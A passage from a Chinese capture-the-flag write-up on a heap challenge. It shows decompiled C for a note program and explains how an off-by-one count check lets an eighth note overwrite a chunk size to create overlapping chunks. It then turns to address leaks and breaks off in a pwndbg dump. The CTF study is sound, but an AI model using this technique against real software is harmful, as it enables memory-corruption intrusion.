&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;init_0&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alarm(&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  gp = (global_list *)&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里储存的结构体的大小为 0x18 字节，gp 一共申请了 7 个。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; note            struc ; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;, mappedto_15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt;                                         ; XREF: global_list/r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; size            dq ?                    ; XREF: add+&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;/r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000008&lt;/span&gt; ptr             dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000010&lt;/span&gt; real_size       dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt; note            ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;size 是我们在申请 chunk 的时候提供的，real_size 是我们输入的数据的长度。&lt;/p&gt;
&lt;p&gt;问题出在 add 的时候，同时存在的 note 的数量判断。这里值判断是否大于 7，所以我们申请第 8 个的时候，可以通过检查，那么就造成了数组的御姐，数组储存在 chunk 中，势必会影响下一个 chunk 的头部数据。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 count; &lt;span class=&#34;comment&#34;&gt;// rbp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v1; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 size; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3; &lt;span class=&#34;comment&#34;&gt;// r12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr; &lt;span class=&#34;comment&#34;&gt;// r13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *real_size; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  note *v6; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64)nums &amp;gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Too many notes.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  count = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( gp-&amp;gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;].ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !gp-&amp;gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v1].ptr || count == &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __printf_chk(&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x3FF&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid size.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(size, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __printf_chk(&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  real_size = read_n(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, ptr, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = &amp;amp;gp-&amp;gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6-&amp;gt;size = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ++nums;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6-&amp;gt;ptr = ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6-&amp;gt;real_size = (__int64)real_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __printf_chk(&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Note%lu saved.\n&amp;quot;&lt;/span&gt;, count);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;数组最小限制为 0x400, 没有上限，所以我们可以尽情的构造较大的 chunk。&lt;/p&gt;
&lt;p&gt;观察到，数组溢出时候的情况。因为我们申请 gp 数组的堆块大小只有 0xb0, 实际使用空间只有 0xa8, 那么，我们申请的 7 个结构体恰好可以沾满，那么第 8 个结构体的 size 就会占据下一个 chunk 的头部，修改 chunk_size。如果我们前面的 chunk 申请的比较小，第八个申请的很大，就会导致第一个 chunk 的 size 被更改，实现 overlap。&lt;/p&gt;
&lt;p&gt;主义的时，一旦 8 号 chunk 申请处理啊，就无法 free。&lt;/p&gt;
&lt;p&gt;泄露地址。&lt;/p&gt;
&lt;p&gt;在向 note 中读入数据的时候，会自动补全空字符。输出使用格式化字符串，只是 add 时使用了 calloc，初始化 chunk。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *__fastcall &lt;span class=&#34;title function_&#34;&gt;read_n&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr, __int64 size)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *v3; &lt;span class=&#34;comment&#34;&gt;// r14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *pos; &lt;span class=&#34;comment&#34;&gt;// r15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v5; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *end; &lt;span class=&#34;comment&#34;&gt;// r13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v7; &lt;span class=&#34;comment&#34;&gt;// rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+17h] [rbp-41h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v11; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-40h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v11 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pos = ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt; - (_QWORD)ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    end = &amp;amp;ptr[size];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v7 = (__int64)&amp;amp;pos[v5];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( read(fd, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;) &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || buf == &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *pos++ = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( pos == end )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_8;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *pos = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_8:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3[size - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)v7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改掉第一个 notechunk 的 size 后，直接将其 free，就会将第二个覆盖到&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x5572d1a52290&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52290&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000000000b1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 